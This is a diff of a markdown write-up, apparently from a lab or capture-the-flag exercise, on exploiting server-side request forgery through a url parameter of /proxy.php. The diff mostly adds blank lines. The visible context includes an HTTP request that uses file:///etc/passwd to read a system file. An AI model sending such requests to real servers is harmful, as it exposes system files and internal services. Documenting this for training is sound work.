@@ -1,9 +1,11 @@
 # Advanced SSRF - northstarstudio.hv
 
 ## 🎯 Objective
+
 Exploit Server-Side Request Forgery to access internal services and files, demonstrating multi-vector SSRF impact.
 
 ## 🔍 Vulnerability Analysis
+
 - **Type:** Server-Side Request Forgery (SSRF)
 - **Endpoint:** `GET /proxy.php`
 - **Parameter:** `url`
@@ -13,6 +15,7 @@ Exploit Server-Side Request Forgery to access internal services and files, demon
 ## 💥 Exploitation
 
 ### Phase 1: Internal File Disclosure
+
 ```http
 GET /proxy.php?url=file:///etc/passwd HTTP/1.1
 Host: northstarstudio.hv
@@ -43,3 +46,4 @@ Impact Chaining: Connecting multiple SSRF vectors for comprehensive access
 Protocol Analysis: Understanding different URL scheme behaviors in SSRF contexts
 
 Conducted in controlled environment for educational purposes
+```
